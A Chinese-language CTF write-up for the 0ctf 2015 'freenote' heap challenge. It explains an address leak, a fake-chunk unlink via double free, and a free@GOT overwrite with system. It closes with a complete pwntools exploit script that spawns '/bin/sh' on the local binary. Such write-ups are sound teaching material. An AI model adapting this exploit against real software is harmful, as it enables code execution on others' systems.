# 2015 0ctf pwn--freenote_x64(jarvisoj level6_x64)

题目类似记事本的功能

![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/1.png)

漏洞在free堆时没有进行检查

![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/2.png)

而且在glibc中，free之后不会清空堆中的内容，输入并没有在末尾加'\x00'截断，可以读取超过预定长度的内容。

注意：程序malloc最小的数值是0x80，然后是0x180。

## 利用思路

double free和unlink搭配实现任意地址读写，目标是修改free_got中的内容。

### 第一步 求出heap_base和libc_base

unlink 需要 修改 fd和bk，所以要知道heap地址，进行修改。

为了防止合并，并一次性获取heap和libc地址，我们分配4个新块。

```python
new(1,'a')
new(1,'a')
new(1,'a')
new(1,'a')
delete(0)
delete(2)
```

这时chunk0的fd，bk和chunk2的fd，bk如下

main_arena<-->  fd  chunk 0  bk <--->   fd    chunk 2   bk ---》main_arena

![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/3.png)

这时，新建两个0x8的chunk，覆盖掉chunk2，chunk0，由于new时没有清空堆，list时便会把堆地址和main_arena的地址泄露出来。

![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/4.png)

堆基地址

![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/5.png)

偏移为 0x242a000 - 0x242b940 = 0x1940

libc_base

![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/6.png)

偏移为 0x7f4658fb9b78 - 0x7f4658c1e000 = 0x 39bb78(靶机偏移为0x3be7b8)

### 第二步 修改chunk的fd，bk，通过unlink操作，达到地址任意写

先找到通过unlink的地址，由下图我们选择了chunk2，即heap+0x60
![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/5.png)

还记得上次的unlink吗，2018网鼎杯的babyheap，那是向前合并，这次我们来向后合并，先伪造chunk

```python
payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10)
payload01 += "A"*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)
 
payload02  = "a"*0x80 + p64(0x110) + p64(0x90) + "A"*0x80
payload02 += p64(0) + p64(0x71) + "A"*0x60
new(len(payload02), payload02)
delete(2)
```

![image](https://github.com/lhc328/pwn/blob/master/picture/20150ctffreenotex64level6x64/7.png)

free chunk2时，系统会检测chunk2 的flag位为0，prev_size为0x110，地址减0x110到0x51（fake chunk处），p指针指向fake chunk，unlink检测 p->fd->bk==p   p->bk ->fd ==p , 即0xbfd018 + 0x18 = 0xbfd030(上图是0x242030, 由于运行了两次，记住030就好了 -_-！！)    0xbfd020 + 0x10 = 0xbfd030

完成unlink后，chunk0的ptr会指向0xbfd018,我们修改chunk0的ptr指向 free_got，然后再修改时就再 free_got处修改了，这时我们写进去system函数的地址。

```python
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + "A"*0x40
payload04 = p64(system)
 
#
edit(0, 0x60, payload03)
edit(0, 0x8, payload04)
```

最后新建一个chunk4，里面内容为"/bin/sh\x00"

free(4),就会执行system('/bin/sh')了

exp:

```python
from pwn import *
 
p = process("./freenote")
elf = ELF("./freenote")
libc = ELF("./libc.so.6")
context.log_level = 'debug'
 
def list():
    p.recvuntil("Your choice: ")
    p.sendline("1")
 
def new(length, note):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("new note: ")
    p.sendline(str(length))
    p.recvuntil("note: ")
    p.send(note)
 
def edit(index, length, note):
    p.recvuntil("Your choice: ")
    p.sendline("3")
    p.recvuntil("Note number: ")
    p.sendline(str(index))
    p.recvuntil("Length of note: ")
    p.sendline(str(length))
    p.recvuntil("Enter your note: ")
    p.send(note)
 
def delete(index):
    p.recvuntil("Your choice: ")
    p.sendline("4")
    p.recvuntil("Note number: ")
    p.sendline(str(index))
 
def exit():
    p.recvuntil("Your choice: ")
    p.sendline("5")
 
#leak address
new(1, 'a')
new(1, 'a')
new(1, 'a')
new(1, 'a')
 
delete(0)
delete(2)
 
new(8, '12345678')
new(8, '12345678')
 
list()
p.recvuntil("0. 12345678")
heap = u64(p.recvline().strip("\x0a").ljust(8, "\x00")) - 0x1940
p.recvuntil("2. 12345678")
libcbase = u64(p.recvline().strip("\x0a").ljust(8, "\x00")) - 0x3c4b78
 
log.info("heap: %s" % hex(heap))
log.info("libc_base: %s" % hex(libcbase))
 
delete(3)
delete(2)
delete(1)
delete(0)
 
#double link
gdb.attach(p)
payload01  = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10)
payload01 += "A"*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)
 
payload02  = "A"*0x80 + p64(0x110) + p64(0x90) + "A"*0x80
payload02 += p64(0) + p64(0x71) + "A"*0x60
new(len(payload02), payload02)
delete(2)
 
 
 
#change
 
free_got = elf.got['free']
system = libcbase + libc.symbols['system']
 
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + "A"*0x40
payload04 = p64(system)
 
#
edit(0, 0x60, payload03)
edit(0, 0x8, payload04)
 
payload05 = "/bin/sh\x00"
new(len(payload05), payload05)
delete(4)
 
p.interactive()
```

